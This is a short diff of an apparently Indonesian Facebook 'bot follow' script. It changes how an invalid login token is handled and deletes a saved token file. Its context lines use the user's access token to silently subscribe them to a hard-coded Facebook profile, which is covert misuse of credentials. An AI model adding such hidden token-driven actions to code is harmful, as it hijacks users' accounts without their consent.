@@ -120,8 +120,9 @@ def bot_follow():
 		nama = a["name"]
 		id = a["id"]
 	except IOError:
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		token()
+                print(' \033[0;97m[\033[0;91m!\033[0;97m]Invalid Token ! ')
+                jalan(' Please Login Again')
+                os.system('rm -rf login_r.txt')
 	amanda = ("Gantengnya Aa @[100000834003593:]")
         raka = ("Script Nya Krend Bang...")
         requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
